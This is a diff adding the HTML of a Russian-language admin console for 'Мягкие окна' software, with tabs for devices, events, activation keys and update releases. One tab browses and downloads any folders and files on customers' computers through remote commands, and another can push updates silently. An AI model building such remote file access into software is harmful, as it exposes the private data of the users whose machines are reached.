@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Мягкие окна Excl 2.6.3 — админка</title>
+  <link rel="stylesheet" href="style.css?v=5" />
+</head>
+<body>
+  <header>
+    <div class="brand">МЯГКИЕ ОКНА <span>Excl 2.6.3 · админка производства</span></div>
+    <div class="actions">
+      <button id="refresh">Обновить</button>
+      <button id="logout" class="ghost">Выйти</button>
+    </div>
+  </header>
+  <main>
+    <section id="gate" class="gate">
+      <h1>Вход в консоль</h1>
+      <p class="hint" style="margin-bottom:8px">Версия входа: 5 · склад и доска заказов</p>
+      <p>Пароль администратора производства.</p>
+      <input id="password" type="password" placeholder="Пароль" autofocus />
+      <button id="enter">Войти</button>
+      <p id="gate-error" class="hint"></p>
+    </section>
+
+    <section id="app" class="hidden">
+      <nav class="tabs">
+        <button data-tab="devices" class="active">Устройства</button>
+        <button data-tab="events">События</button>
+        <button data-tab="files">Файлы</button>
+        <button data-tab="keys">Ключи</button>
+        <button data-tab="release">Обновление</button>
+      </nav>
+
+      <div id="devices" class="tab">
+        <div class="stats">
+          <div class="stat"><b id="stat-count">0</b><span>установок</span></div>
+          <div class="stat"><b id="stat-online">0</b><span>активны за сутки</span></div>
+          <div class="stat"><b id="stat-version">—</b><span>последняя версия</span></div>
+        </div>
+        <p class="hint">Показаны устройства версии 2.1 и новее. Более старые установки скрыты.</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Установка</th><th>Версия</th><th>Последний запуск</th><th>Окон</th><th>Файлов</th><th>ПК</th></tr></thead>
+            <tbody id="devices-body"></tbody>
+          </table>
+        </div>
+        <div id="device-detail" class="detail hidden">
+          <div class="detail-head">
+            <h2 id="detail-title">Устройство</h2>
+            <button id="close-detail" class="ghost">Закрыть</button>
+          </div>
+          <div id="detail-body"></div>
+        </div>
+      </div>
+
+      <div id="events" class="tab hidden">
+        <div class="row">
+          <label>Установка <input id="events-install" placeholder="installId" /></label>
+          <button id="load-events">Показать</button>
+        </div>
+        <div id="events-list" class="events"></div>
+      </div>
+
+      <div id="files" class="tab hidden">
+        <h2>Файлы на компьютере клиента</h2>
+        <p class="hint">Клиент выполняет команду в течение 10 минут, пока приложение запущено. Можно смотреть любые папки и текстовые файлы.</p>
+        <div class="row">
+          <label>Установка <input id="files-install" placeholder="okna-…" /></label>
+          <label>Путь <input id="files-path" placeholder="C:\" /></label>
+          <button id="files-list">Открыть</button>
+          <button id="files-roots" class="ghost">Диски</button>
+          <button id="files-up" class="ghost">Вверх</button>
+        </div>
+        <p id="files-status" class="hint"></p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Имя</th><th>Тип</th><th>Размер</th><th>Изменён</th></tr></thead>
+            <tbody id="files-body"></tbody>
+          </table>
+        </div>
+        <h3 id="file-title"></h3>
+        <pre id="file-content" class="hidden"></pre>
+        <p><button id="file-download" class="hidden">Скачать файл</button></p>
+      </div>
+
+      <div id="keys" class="tab hidden">
+        <h2>Ключи активации</h2>
+        <p class="hint">Одноразовый ключ — одна активация. Многоразовый — заданное число компьютеров. Отключённый ключ блокирует запуск.</p>
+        <div class="form">
+          <label>Тип
+            <select id="key-type">
+              <option value="single">Одноразовый</option>
+              <option value="multi">Многоразовый</option>
+            </select>
+          </label>
+          <label>Активаций <input id="key-count" type="number" min="1" value="1" /></label>
+          <label>Заметка <input id="key-note" placeholder="кому / для чего" /></label>
+          <button id="create-key" class="primary">Создать ключ</button>
+          <p id="key-status" class="hint"></p>
+        </div>
+        <div class="table-wrap" style="margin-top:14px">
+          <table>
+            <thead><tr><th>Ключ</th><th>Тип</th><th>Активации</th><th>Статус</th><th>Создан</th><th></th></tr></thead>
+            <tbody id="keys-body"></tbody>
+          </table>
+        </div>
+        <div id="key-detail" class="detail hidden">
+          <div class="detail-head">
+            <h2 id="key-detail-title">Активации</h2>
+            <button id="close-key-detail" class="ghost">Закрыть</button>
+          </div>
+          <div id="key-detail-body"></div>
+        </div>
+      </div>
+
+      <div id="release" class="tab hidden">
+        <h2>Выпуск обновления</h2>
+        <p class="hint">Загрузите готовый DMG, EXE или ZIP на сайт/Яндекс.Диск/любой HTTPS-хостинг и вставьте прямую ссылку. Клиент увидит кнопку «Доступно обновление» и скачает файл. В 2.4: финансы заказов, высота фартука на чертеже, 3–4 окна на A4 и вкладка «Потребность» в складе.</p>
+        <div class="form">
+          <label>Версия <input id="rel-version" placeholder="2.6.3" /></label>
+          <label>Файл обновления (DMG / EXE / ZIP)
+            <input id="rel-file" type="file" accept=".dmg,.exe,.zip" />
+          </label>
+          <label>Куда загрузить
+            <select id="rel-target">
+              <option value="auto">Определить по файлу</option>
+              <option value="windows">Windows</option>
+              <option value="macos">macOS</option>
+            </select>
+          </label>
+          <p id="rel-file-info" class="hint"></p>
+          <progress id="rel-progress" max="100" value="0" class="hidden"></progress>
+          <button id="upload-release" type="button">Загрузить файл в R2</button>
+          <label>Ссылка Windows <input id="rel-url-windows" placeholder="https://…/MyagkieOkna-setup.exe" /></label>
+          <label>SHA-256 Windows <input id="rel-sha-windows" placeholder="необязательно" /></label>
+          <label>Ссылка macOS <input id="rel-url-macos" placeholder="https://…/MyagkieOkna.dmg" /></label>
+          <label>SHA-256 macOS <input id="rel-sha-macos" placeholder="необязательно" /></label>
+          <label>Общая ссылка (если одна на все ОС) <input id="rel-url" placeholder="https://…" /></label>
+          <label>Общий SHA-256 <input id="rel-sha" placeholder="необязательно" /></label>
+          <label>Заметки <textarea id="rel-notes" rows="3"></textarea></label>
+          <label class="check"><input type="checkbox" id="rel-all" checked /> Все клиенты</label>
+          <label>Только installId (через запятую) <input id="rel-ids" placeholder="okna-…, okna-…" /></label>
+          <label class="check"><input type="checkbox" id="rel-enabled" checked /> Обновление включено</label>
+          <label class="check"><input type="checkbox" id="rel-auto" /> Ставить автоматически, без вопроса</label>
+          <button id="save-release" class="primary">Опубликовать</button>
+          <p id="release-status" class="hint"></p>
+        </div>
+        <pre id="release-current"></pre>
+      </div>
+    </section>
+  </main>
+  <script src="config.js?v=5"></script>
+  <script src="app.js?v=5"></script>
+</body>
+</html>
